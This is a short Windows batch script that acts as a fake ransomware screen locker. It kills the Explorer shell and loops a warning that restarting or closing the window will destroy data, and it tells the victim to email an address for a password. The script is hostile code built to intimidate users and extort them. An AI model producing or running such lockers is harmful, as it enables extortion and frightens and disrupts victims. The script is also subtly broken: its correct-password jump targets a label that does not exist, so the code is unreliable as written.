color 0A
@echo off 
title [Window title]
taskkill /f /im explorer.exe 
:bucle 
cls    
echo =============================================           
echo            READ CAREFULLY !.
echo =============================================
echo  - Don't restart the computer!
echo  - Restarting will delete the data from the hard drive!
echo  - If you close this window you will not be able to recover your computer!
echo  - WRITE TO [Email] TO GET THE PASSWORD !.
echo =============================================
echo  - Enter the password that you received by mail.
echo =============================================
set /p pass= Enter the password here:
if %pass%==[Password] (goto correctpass) ELSE (goto bucle)
:passcorrecto
echo Congratulations! The password is correct.
start explorer.exe
pause
exit
